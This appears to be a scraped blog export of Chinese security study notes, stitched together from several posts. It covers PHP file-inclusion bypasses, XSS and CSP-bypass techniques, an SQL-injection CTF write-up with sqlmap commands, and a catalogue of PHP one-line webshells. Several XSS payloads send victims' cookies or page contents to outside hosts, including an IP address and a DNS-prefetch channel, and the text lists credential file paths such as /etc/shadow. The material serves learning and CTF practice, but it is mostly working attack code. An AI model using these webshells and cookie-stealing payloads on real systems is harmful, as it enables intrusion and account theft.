利用zip://和phar://，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。 zip:// [访问参数] ?file=zip://D:\\zip.jpg%23phpinfo [拼接后] ?file=zip://D:\\zip.jpg#phpinfo.txt phar:// [访问参数] ?file=phar://zip.zip/phpinfo [拼接后] ?file=phar://zip.zip/phpinfo.txt Example： (我的环境根目录中有php.zip压缩包，内含phpinfo.txt，其中包含代码)） 所以分别构造payload为：* ?file=zip://D:\\PHPWAMP_IN3\\wwwroot\\php.zip%23phpinfo ?file=phar://../../php.zip/phpinfo 对应的结果分别为： 4.2.3 长度截断 利用条件： php版本&lt;php 5.2.8 原理： Windows下目录最大长度为256字节，超出的部分会被丢弃 Linux下目录最大长度为4096字节，超出的部分会被丢弃。 利用方法： 只需要不断的重复 ./(Windows系统下也可以直接用 . 截断) ?file=shell.php./././。。省略。。 //指定的后缀的被丢弃，成功包含木马文件 则指定的后缀.txt会在达到最大值后会被直接丢弃掉 4.2.4 %00截断 HP魔术引导介绍 当sql句中含有单引号，双引号，反斜杠和NUL时，这时候如果不对这些符号进行转义，写入数据库时就会出错，而魔术引号magic_quotes_gpc()就是对这些符号进行转义以便能把数据正确写入数据库。不过该参数在php.ini文件中修改。 PHP魔术引号特性已自 PHP5.3.0起废弃并将自PHP5.4.0起移除。也就是说在本实验环境的PHP版本中仍是存在的 在低版本中php读取文件名时认为%00是终止符，对于%00后面的内容就会失效 利用条件： magic_quotes_gpc = Off php版本 &lt; php 5.3.4 利用方法： 直接在文件名的最后加上%00来截断指定的后缀名 ?file=shell.php%00 //现阶段%00截断不常用 4.2.5 点号截断 原理： windows系统 点号 长于 256，超出的部分会被丢弃； linux系统 点号 长于 4096，超出的部分会被丢弃； 示例： http://192.168.100.150/test_include/index.php?page=1.png................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................. burp抓包修改即可 4.2.6 双写绕过 当写入文件时，发现删除某些特殊字符，我们可以判断是删除了其中字符，例如”php\"，“…/”，只需 再增加一个使其删除后得到我们需要的，需要注意绝对路径与相对路径。 4.2.7 大小写混合绕过 如果在文件包含时，服务器对我们传入的参数没有进行严格过滤，比如没没有对大小写进行过滤，我们可以使用大小写混合进行绕过。 0x05 漏洞防护 1、使用str_replace等方法过滤掉危险字符 2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中） 3、php版本升级，防止%00截断 4、对上传的文件进行重命名，防止被读取 5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。 6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化 ./表示当前位置路径，../表示上一级路径位置，在linux中同样适用。 3）一些常见的敏感信息路径： Windows系统： c:\\boot.ini // 查看系统版本 c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件 c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码 c:\\ProgramFiles\\mysql\\my.ini // MySQL配置 c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码 c:\\windows\\php.ini // php 配置信息 Linux/Unix系统： /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件","categories":["常见top漏洞"]},{"title":"浅析XSS漏洞","path":"/2023/08/07/qian-xi-xss-lou-dong/","content":"XSS注入总结 一、XSS漏洞原理 XSS，即跨站脚本攻击，是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码，少数情况下还有ActionScript、VBScript等语言），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码，从而达到攻击的目的。 当应用程序没有对用户提交的内容进行验证和重新编码，而是直接呈现给网站的访问者时，就可能会触发XSS攻击。 二、XSS漏洞的危害 （1）窃取管理员帐号或Cookie。入侵者可以冒充管理员的身份登录后台，使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。 （2）窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。 （3）网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。 （4）发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。 三、XSS漏洞的分类 1、反射型XSS 反射型XSS，也称为非持久性XSS，是最常见的一种XSS。 XSS代码常常出现在URL请求中，当用户访问带有XSS代码的URL请求时，服务器端接收请求并处理，然后将带有XSS代码的数据返回给浏览器，浏览器解析该段带有XSS代码的数据并执行，整个过程就像一次反射，故称为反射型XSS。 该类攻击的主要特点是它的及时性和一次性，即用户提交请求后，响应信息会立即反馈给用户。该类攻击常发生在搜索引擎、错误提示页面等对用户的输入做出直接反应的场景中。 2、存储型XSS 存储型XSS，也称为持久性XSS。 在存储型XSS中，XSS代码被存储到服务器端，因此允许用户存储数据到服务器端的Web应用程序可能存在该类型XSS漏洞。攻击者提交一段XSS代码后，服务器接收并存储，当其他用户访问包含该XSS代码的页面时，XSS代码被浏览器解析并执行。 存储型XSS攻击的特点之一是提交的恶意内容会被永久存储，因而一个单独的恶意代码就会使多个用户受害，故被称为持久性XSS，它也是跨站脚本攻击中危害最的一类。二是被存储的用户提交的恶意内容不一定被页面使用，因此存在危险的响应信息不一定被立即返回，也许在访问那些在时间上和空间上没有直接关联的页面时才会引发攻击，因此存在不确定性和更好的隐蔽性。 这类攻击的一个典型场景是留言板、博客和论坛等，当恶意用户在某论坛页面发布含有恶意的Javascript代码的留言时，论坛会将该用户的留言内容保存在数据库或文件中并作为页面内容的一部分显示出来。当其他用户查看该恶意用户的留言时，恶意用户提交的恶意代码就会在用户浏览器中解析并执行。 3、DOM型XSS DOM (Document Objet Model)指文档对象模型。 DOM常用来表示在HTML和XML中的对象。DOM可以允许程序动态的访问和更新文档的内容、结构等。客户端JavaScript可以访问浏览器的文档对象模型。也就是说，通过JavaScript代码控制DOM节点就可以不经过服务器端的参与重构HTML页面。 该类攻击是反射型XSS的变种。它通常是由于客户端接收到的脚本代码存在逻辑错误或者使用不当导致的。比如Javascript代码不正确地使用各种DOM方法(如document.write)和Javascript内部函数(如eval函数)，动态拼接HTML代码和脚本代码就容易引发DOM型的跨站脚本攻击。 因此，DOM型XSS与前面两种XSS的区别就在于DOM型XSS攻击的代码不需要与服务器端进行交互，DOM型XSS的触发基于浏览器端对DOM数据的解析来完成，也就是完全是客户端的事情。 4、判断是哪一种XSS 发送一次带XSS代码的请求，若只能在当前返回的数据包里发现XSS代码，则是反射型；若以后这个页面的返回包里都会有XSS代码，则是存储型；若在返回包里找不到XSS代码，则是DOM型。 四、XSS漏洞的检测与防御 1、检测 手工检测 手工检测重点要考虑数据输入的地方，且需要清楚输入的数据输出到什么地方。 在检测的开始，可以输入一些敏感字符，比如“&lt;、&gt;、（）”等，提交后查看网页源代码的变化以发现输入被输出到什么地方，且可以发现相关敏感字符是否被过滤。 手工检测结果相对准确，但效率较低。 工具检测 常用工具有AVWS（Acunetix Web Vulnerability Scanner）、BurpSuite等。还有一些专门针对XSS漏洞的检测工具，如：XSSer、XSSF（跨站脚本攻击框架）、BeEF(The Browser Exploitation Framework)等。 2、防御 ●使用黑名单进行 ●对HTML标签或特殊字符进行过滤 ●使用内容安全的CSP ●使用设计上就会自动编码的框架，如：OWASP ESAPI、React JS、JSOUP等，对于JAVA而言，可以使用ESAPI.encoder().encodeForHTML()对字符串进行HTML编码。 ●对于反射型和存储型XSS，可以在数据返回给客户端浏览器时，将敏感字符进行转义，如：将单引号进行编码替换（十进制编码'、十六进制编码'、HTML编码&amp;apos、Unicode编码\\u0027等）。 ●对于DOM型XSS，可以使用上下文敏感数据编码。如：在PHP中的htmlspecialchars（）、htmlentities（）函 数可以将一些预定义的字符转换为HTML实体，如：小于转化为&lt;、大于转化为&gt;、双引号转化为\"、单引号转化为&amp;apos、与转化 为&amp;等。 ●启用浏览器的HttpOnly特性可以组织客户端脚本访问cookie。如：在PHP中可以通过下面的代码设置cookie并启用HttpOnly。 &lt;?php Header(\"Set-Cookie:password=123456;httponly\",false); &gt; 关键点： 目标网站的目标用户 浏览器 不被预期的： 攻击者在输入时提交了可控的脚本内容，然后在输出时被浏览器解析执行 “跨站脚本”重点是脚本：XSS在攻击时会嵌入一段远程的第三方域上的脚本资源。 总之，要想尽一切办法将你的脚本内容在目标网站中目标用户的浏览器上解释执行 1.基于存储型的XSS攻击 上面说了这么多还是不知道xss攻击应该运用在哪些场景下，下面我们把XSS分为有CSP保护和无CSP保护两个场景来实现。 0x01 无CSP保护下的XSS 1.直接嵌入型 当过滤的东西较少时，可以优先考虑这个。这种xss触发方式比较直接，直接嵌入能够xss的js代码，下面看一个例子。 //admin访问页面 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;xss&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var img = new Image(); img.src = 'http://45.78.29.252:8888/?a='+document.cookie; document.getElementsByTagName(\"head\")[0].appendChild(img); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; js代码与图片嵌入head中一起解析，之后将获取的cookie发送至xss平台 2.import导入型 经常用于过滤比较严格的情况，经过实验发现link的属性rel值为import时会将资源请求回来并一同解析，注意必须是完整的资源例如HTML、PHP、JS等。请求的资源必须要设置为允许跨域加载的响应头。 &lt;!-- 无csp 远程包含js文件 --&gt;admin访问页面 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;无csp/远程包含js文件/import&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;link rel=import href=http://yzbbd666.com/2.php&gt; &lt;/body&gt; &lt;/html&gt; 下面是http://yzbbd666.com/2.php文件内容注意填写Access-Control-Allow-Origin &lt;?php header(\"Access-Control-Allow-Origin: *\"); echo 1; ?&gt; &lt;script src=\"https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js\"&gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; $.get(\"http://127.0.0.1/flag.php\",function(data){ //alert(data); location.href=\"http://45.78.29.252:8888/?a=\"+escape(data); }); &lt;/script&gt; 我们发现访问成功了，link的import会首先将访问的资源执行所以会触发xss漏洞，将盗取的才cookie值发送至服务器 3.script导入型 一般也是输入限制比较多的时候，请求访问可以利用script的远程js加载。 //admin访问页面 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;xss&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script src=http://yzbbd666.com/ld.js&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; http://yzbbd666.com/ld.js内容如下，注意这里是js格式 var img = new Image(); img.src = 'http://45.78.29.252:8888/?a='+document.cookie; document.getElementsByTagName(\"head\")[0].appendChild(img); 说明script加载并执行了远程js脚本，并将cookie发送至xss平台 0x02 有CSP保护下的XSS CSP中文意思是内容安全策略，为了保护文档内容而实施的策略，首先简答介绍一下CSP相关内容，其次讲解一下绕过方法。 1.内容安全策略 （1） CSP策略 一个CSP头由多组CSP策略组成，中间由分号分隔，就像这样： Content-Security-Policy: default-src ‘self’ www.baidu.com; script-src ‘unsafe-inline’ 其中每一组策略包含一个策略指令和一个内容源列表 （2） 常用的策略指令 default-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括： child-src指定定义了 web workers 以及嵌套的浏览上下文 connect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。 font-src定义了字体加载的有效来源 img-src定义了页面中图片和图标的有效来源 media-src针对媒体引入的 HTML 多媒体的加载策略。 object-src插件(比如 Flash)，针对 、 或 等标签引入的 flash 等插件的加载策略。 style-src定义了页面中CSS样式的有效来源 script-src 定义了页面中Javascript的有效来源（外部脚本） 内容源 内容源有三种：源列表、关键字和数据 源列表 源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, ‘‘)，端口号也可以使用通配符 (同样是 ‘‘) 来表明所有合法端口都是有效来源。主机通过空格分隔。 有效的主机表达式包括： http://*.foo.com （匹配所有使用 http协议加载 foo.com 任何子域名的尝试。） mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。） https://store.foo.com （匹配所有使用 https协议访问 store.foo.com 的尝试。） 如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。 关键字 ‘none’ 代表空集；即不匹配任何 URL。两侧单引号是必须的。 ‘self’ 代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。 ‘unsafe-inline’ 允许使用内联资源，如内联的script元素、javascript: URL、内联的事件处理函数和内联的style元素，两侧单引号是必须的。 ‘unsafe-eval’ 允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。 Content-Security-Policy: default-src 'self' trustedscripts.foo.com 数据 data: 允许data: URI作为内容来源。 mediastream: 允许mediastream: URI作为内容来源。 Content-Security-Policy: default-src 'self'; img-src 'self' data:; media-src mediastream: 2.跳转 meta标签跳转 在default-src ‘none’的情况下，可以使用meta标签实现跳转 //admin访问页面 &lt;?php header(\"Content-Security-Policy: default-src 'none';\") ;//这里可以设置CSP ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;XSS&lt;/title&gt; &lt;meta http-equiv=\"refresh\" content=\"1;url=http://www.xss.com/x.php?c=[cookie]\" &gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; 发现图片不能被访问，但meta标签中的内容可以被访问，成功弹至xss平台。 小tip：如何获取cookie (1)通过document.cookie获取所有的cookie值，获取到一个cookie所有值在一起的字符串。 (2)因为所有的cookie都是以分号隔开的，所有使用split(‘;’)将这个字符串切开变成数组，存起来。 (3)判断数组中每一项有没有包含cookie名字的，如果有，把对应的值取出来就行。 script脚本跳转 在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。 &lt;script&gt; window.location=\"http://www.xss.com/x.php?c=[cookie]\"; &lt;/script&gt; &lt;script&gt; window.location.href=\"flag.php\"; &lt;/script&gt; prefetch预加载绕过 CSP对link标签的预加载功能考虑不完善。 在Chrome下，可以使用如下标签发送cookie &lt;link rel=\"prefetch\" href=\"http://www.xss.com/x.php?c=[cookie]\"&gt; 在Firefox下，可以将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie &lt;link rel=\"dns-prefetch\" href=\"//[cookie].xxx.ceye.io\"&gt; 实验代码 admin访问界面 注意这里允许里内联脚本，所以理所当然的可以使用跳转的方法获取cookie的值。 &lt;?php header(\"Content-Security-Policy: default-src 'self';script-src 'self' 'unsafe-inline';\") ;//这里可以设置CSP ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;XSS&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var n0t = document.createElement(\"link\"); n0t.setAttribute(\"rel\", \"prefetch\"); n0t.setAttribute(\"href\", \"http://45.78.29.252:8888/?a=\" + String(document.getElementsByTagName(\"html\")[0].innerHTML).substring(0,100)); document.head.appendChild(n0t); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 成功获取cookie值 0x03 XSS绕过技巧 检索到了一个高级xss绕过备忘录（晦涩难懂）等日后拜读吧 XSS 过滤器规避 - OWASP 备忘单系列 0x04 实例解析 这一部分呢将作为长期更新的地方如果遇到好的xss题目可以联系我，将一些不错的xss题目总结在这里，为的是把理论知识与实践相结合 0x1 htcf guestbook 从代码中我们可以看到基本的过滤 function filter($string) { $escape = array('\\'','\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; $string = preg_replace($safe, 'hacker', $string); $xsssafe = array('img','script','on','svg','link'); $xsssafe = '/' . implode('|', $xsssafe) . '/i'; return preg_replace($xsssafe, '', $string); } 函数解析： 1、explode()函数 把字符串打散为数组： 2、implode()函数 把数组元素组合为字符串： &lt;?php $str = '107_lab_2017'; $array=explode('_', $str);//以下划线为分隔符将字符串打散为数组 print_r($array); echo implode('_', $array);//以下划线为分隔符将数组合并成字符串 ?&gt; 我们看到其实只有很少的过滤，而且是单层的，对于xss来说，只需要复写2次就可以绕过了，类似于 scrscriptipt这样。 所以其实关键在于CSP Content-Security-Policy:default-src 'self'; script-src 'self' 'unsafe-inline'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' 这里上述都已经提到绕过方法主要有两种，一种直接利用跳转，第二种利用预加载 不熟悉的人可能并不清楚其中的CSP有什么样的问题，事实，整个CSP除了限定了域以外，没有做任何的限制，可以执行任意的js，这也就导致了使用人数比较多的非预期做法。 1.跳转绕过： &lt;scrscriptipt&gt;window.open(\" http://xxxx:8080/cookie.asp?msg= \"+document.body)&lt;/scrscr iptipt&gt; &lt;scrscriptipt&gt;window.locatioonn.href%3d\"http%3a// www.example.com/xss/write.php%3fdomain%3d \"%2bescape(document.cookie)%3b&lt;/sscriptcript&gt; &lt;scrscriptipt&gt;var a=document.createElement(\"a\");a.href=' http://xss.com/?cookie= '+escape(document.cookie);a.click();&lt;/sscriptcript&gt; 上面几种思路类似，通过构造新开页面或者跳转来解决域限制，由于js可以任意构造，所以这里也就通过特别的方式绕过了原本的限制。 2.chrome对CSP支持的不完整绕过 预加载绕过 从文章中可以获得对漏洞的整体了解，主要是2篇 第一篇 lorexxar大佬的 后台bot使用的也正是chrome浏览器，由于浏览器对CSP特性支持的不完整，导致link标签的白名单特性存在跨域请求的能力，所以构造payload &lt;Scscriptript&gt;var n0t = document.createElement(\"liscriptnk\");n0t.setAttribute(\"rel\", \"prefetch\");n0t.setAttribute(\"href\", \"//xxx:2333/\" + document.cookie);document.head.appendChild(n0t);&lt;/Scscriptript&gt; 后面xss平台或者vps接受一发搞定 0x05 0ctf simplexss 复现一下xss环境。 实验环境: 192.168.43.182 （本地主机） 192.168.43.165 （flag所在地） 192.168.43.165 1.php 主要实现了留言板的功能 &lt;?php #header(\"Content-Security-Policy: default-src 'self';\") ;//这里可以设置CSP ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;XSS&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php $a = $_GET['a']; $link = new mysqli(\"localhost\",\"root\",\"*****\",\"test\") or die(\"error\".mysql_error()); if ($link) { echo 1; $result = $link-&gt;query(\"INSERT INTO yz VALUES ('$a','1','2','3')\"); if($result) echo 2; $re = $link-&gt;query(\"SELECT * FROM yz\"); for($i = 0;$i&lt;$re-&gt;num_rows;$i++) { $row = $re-&gt;fetch_row(); echo $row[0]; } } ?&gt; &lt;script &gt; document.getElementsByClassName(\"input\"); document. &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 192.168.43.182 3.php &lt;?php header(\"Access-Control-Allow-Origin: *\"); ?&gt; &lt;script&gt; function getinfo(str) { var node=document.createElement(\"script\"); node.type=\"text/javascript\"; node.src=\"http://192.168.43.182/2.php?a=1234\"+escape(str); document.getElementsByTagName(\"HEAD\")[0].appendChild(node); } var xmlhttp=new XMLHttpRequest(); xmlhttp.open(\"GET\",\"http://127.0.0.1/flag.php\",true); xmlhttp.onreadystatechange=function() { //if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) { getinfo(xmlhttp.responseText); } } xmlhttp.send(); &lt;/script&gt; 在本地打开浏览器输入 http://192.168.43.165/1.php?a=&lt;link%20rel=import%20href=http://192.168.43.182/3.php&gt; import 会导入远程资源并执行 当flag端打开1.php查看留言板时会使得3.php脚本执行，从而将flag的内容发送至本地。 以上我目前看不懂，留着吧… 5.1 常见标签及属性 下面我列举的标签大部分是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发。 scirpt 标签 标签用于定义客户端脚本，比如 JavaScript。 &lt;script&gt;alert(1);&lt;/script&gt; &lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt; 例如： &lt;?php ini_set(&quot;display_errors&quot;, 0); $str = $_GET[&quot;name&quot;]; echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;; ?&gt; **利用payload：** &lt;script&gt;alert(1)&lt;/script&gt; #### img 标签 标签定义 HTML 页面中的图像。 &lt;img src=1 onerror=alert(1);&gt; &lt;img src=1 onerror=alert(&quot;xss&quot;);&gt; #### input 标签 标签规定了用户可以在其中输入数据的输入字段。 onfocus 事件在对象获得焦点时发生： &lt;input onfocus=alert(1);&gt; 竞争焦点，从而触发onblur事件： &lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt; input 标签的 autofocus 属性规定当页面加载时 元素应该自动获得焦点。可以通过autofocus属性自动执行本身的focus事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发： &lt;input onfocus=&quot;alert(1);&quot; autofocus&gt; &quot; οnclick=alert(1)&gt;这样需要点击一下输入框&lt;br&gt; &quot; onmouseover=alert(1)&gt;需要鼠标划过输入框&lt;br&gt; 例如： &lt;?php ini_set(&quot;display_errors&quot;, 0); $str = $_GET[&quot;keyword&quot;]; echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt; &lt;form action=level2.php method=GET&gt; &lt;input name=keyword value=&quot;&#x27;.$str.&#x27;&quot;&gt; &lt;input type=submit name=submit value=&quot;搜索&quot;/&gt; &lt;/form&gt; &lt;/center&gt;&#x27;; ?&gt; 分析代码，仍然是使用get方法，从url中接受一个keyword参数，不过这里用到一个过滤函数htmlspecialchars()，这个函数把预定义的字符转换为 HTML 实体，等于","categories":["常见top漏洞"]},{"title":"攻防世界-NewsCenter","path":"/2023/08/06/newscenter/","content":"题目描述： 无 题目解题： 方法一：手工注入 这里环境出了问题，怎么刷新也显示不了，就跟着wp走一遍吧 点进去看到如下页面 毕竟已经知道是sql注入了，直接看wp分析吧： 看到数据包最下方有个POST提交的 search =1，看到这里不知道大家想到了什么没有 (我第一时间是想到了sql注入) 于是我去尝试，因为search框是能输入字符的所以应该先想他为字符型注入，我比较习惯于用 order by 去判断是否有sql注入 于是在这里构造search=1’ order by 3 --+，burp suite里发送给repeater 再尝试search=1’ order by 4 --+ 非常好出现错误了，接下来是利用sql注入的联合查询 search=-1’ union select 1,2,3 --+ //这里-1是为了不占用回显位 判断回显位为2,3 然后search=-1’ union select 1,version(),database() --+ 获取sql版本和当前数据库名 这里为什么要获取数据库版本呢因为mysql大于5.0以上的版本有一个 系统数据库information_schema里面的tables表和columns表包含了其他所有的表和列这样我们就可以有据查询 并且这里知道了当前数据库为news 然后再构造sql语句 search=-1’ union select 1,version(),group_concat(table_name) from information_schema.tables where table_schema=‘news’ --+ 这里可以看到有两个表news，和secret_table，news应该就是页面上的那些所以我们去找flag要从secret_table表中去找 再构造sql语句 search=-1’ union select 1,version(),group_concat(column_name) from information_schema.columns where table_name=‘secret_table’ --+ 看到有两个列id,fl4g答案应该就在fl4g里面了 最后的sql语句 search=-1’ union select 1,version(),group_concat(fl4g) from secret_table --+ 方法二：sqlmap 搜索框中填入内容，如‘1’，回车搜索抓包，将抓到包的内容保存在txt文档里 使用sqlmap的-r进行注入如下，其中C:\\Users\\xxx\\Desktop\\1.txt为保存数据包的txt文件绝对路径 #查找数据库 sqlmap.py -r “C:\\Users\\xxx\\Desktop\\1.txt” --dbs #或查找当前数据库 sqlmap.py -r “C:\\Users\\xxx\\Desktop\\1.txt” --current-dbs #查找news数据库中的表 sqlmap.py -r “C:\\Users\\xxx\\Desktop\\1.txt” -D news --tables #查找secret_table表中的列 sqlmap.py -r “C:\\Users\\xxx\\Desktop\\1.txt” -D news -T serect_table --columns #查找fl4g列中的字段（内容），出现flag sqlmap.py -r “C:\\Users\\xxx\\Desktop\\1.txt” -D news -T serect_table -C fl4g --dump 怎么说，没有过滤，很新手 参考文章： 方法一参考 方法二参考","categories":["攻防世界"]},{"title":"浅析SSTI漏洞","path":"/2023/08/06/qian-xi-ssti-lou-dong/","content":"SSTI注入姿势 一、常见代码执行函数 代码执行函数主要有（9个）：eval()，assert()，call_user_func()，create_function()，array_map()，call_user_func_array()，array_filter()，uasort()，preg_replace() 1- eval() 传入的参数必须为PHP代码，即需要以分号结尾。 命令執行：cmd=system(whoami); 菜刀连接密码：cmd &lt;?php @eval($_POST['cmd']);?&gt; 特别注意：php中@是干什么的 屏蔽掉出错信息,有@时就算连接出错,也不会报错的 原因是防止别人根据错误提示信息来推测出你的数据库结构进行注入攻击一类的黑客行为 2- assert() --（最好不要加上分号作为结尾） assert函数是直接将传入的参数当成PHP代码，不需要以分号结尾（特别注意），有时加上分号不会显示结果。 命令執行：cmd=system(whoami) 菜刀连接密码：cmd &lt;?php @assert($_POST['cmd'])?&gt; 3- call_user_func() 传入的参数作为assert函数的参数 命令执行：cmd=system(whoami) 菜刀连接密码：cmd &lt;?php call_user_func(\"assert\",$_POST['cmd']); ?&gt; &lt;?php call_user_func($_POST[\"fun\"],$_POST[\"para\"]) ?&gt; //post:fun=assert&amp;para=phpinfo(); 4- create_function() 创建匿名函数执行代码 执行命令和上传文件参考eval函数(必须加分号)。 &lt;?php $func =create_function('',$_POST['cmd']);$func(); ?&gt; &lt;?php $a= $_POST['func']; $b = create_function('$a',\"echo $a\"); $b(''); ?&gt; //post:func=phpinfo(); 5- array_map() array_map() 函数 将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。 命令执行http://localhost/123.php?func=system cmd=whoami 菜刀连接http://localhost/123.php?func=assert 密码：cmd &lt;?php $func=$_GET['func']; $cmd=$_POST['cmd']; $array[0]=$cmd; $new_array=array_map($func,$array); echo $new_array; ?&gt; 6- call_user_func_array() 将传入的参数作为数组的第一个值传递给assert函数 cmd=system(whoami) 菜刀连接密码：cmd &lt;?php $cmd=$_POST['cmd']; $array[0]=$cmd; call_user_func_array(\"assert\",$array); ?&gt; 7- array_filter() 用回调函数过滤数组中的元素：array_filter(数组,函数) 命令执行func=system&amp;cmd=whoami 菜刀连接http://localhost/123.php?func=assert 密码cmd &lt;?php $cmd=$_POST['cmd']; $array1=array($cmd); $func =$_GET['func']; array_filter($array1,$func); ?&gt; 8- uasort()函数 php环境&gt;=&lt;5.6才能用 uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。 命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami); 菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd]) 密码：cmd &lt;?php usort($_GET,'asse'.'rt'); ?&gt; 9- preg_replace() preg_replace('正则规则','替换字符'，'目标字符') 执行命令和上传文件参考assert函数(不需要加分号)。 将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。 &lt;?php preg_replace(\"/test/e\",$_POST[\"cmd\"],\"jutst test\"); ?&gt; 这里可以使用chr()函数转换ASCII编码来执行代码。 #phpinfo(); eval(chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111).chr(40).chr(41).chr(59)) 二、常见命令执行函数 *命令执行函数主要有（7个）：system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()/proc_popen()，反引号 `` 1- system() 作用 将字符串作为OS命令执行，自带输出功能。 &lt;?php system($_POST[\"cmd\"]);?&gt; 2-passthru() 作用 将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。 &lt;?php passthru($_POST[\"cmd\"]);?&gt; 3- exec() 作用 将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。 &lt;?php echo exec($_POST[\"cmd\"]);?&gt; &lt;?php print exec($_POST[\"cmd\"]);?&gt; //他的输出结果需要打印，system()不用打印 4- pcntl_exec() linux: &lt;?php pcntl_exec(\"/bin/bash\",array($_POST[\"cmd\"])); ?&gt; 用的不多。暂时略过。 5- shell_exec() 作用 将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容。 &lt;?php echo shell_exec($_POST[\"cmd\"]); ?&gt; &lt;?php print shell_exec($_POST[\"cmd\"]); ?&gt; 6- popen()/proc_open() 作用 该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。 linux: &lt;?php $handle = popen(\"/bin/ls\",\"r\");?&gt; windows: &lt;?php $cmd = $_POST['cmd'].\"&gt;&gt; 1.txt\"; //此时的$cmd=ipconfig &gt;&gt; 1.txt popen(\"$cmd\",'r'); //实际上就是 popen(\"ipconfig &gt;&gt; 1.txt\", \"r\"),把执行结果放入1.txt文件，通过访问1.txt文件查看执行结果。 ?&gt; 7- 反引号 `` 作用 [``]反引号里面的代码也会被当作OS命令来执行 &lt;?php echo `whoami`?&gt; 或者： &lt;?php $cmd = $_GET['cmd'];print `$cmd`; ?&gt; 详解查看https://blog.csdn.net/weixin_39934520/article/details/109231480?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=popen是干什么的&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-109231480.nonecase&amp;spm=1018.2226.3001.4187 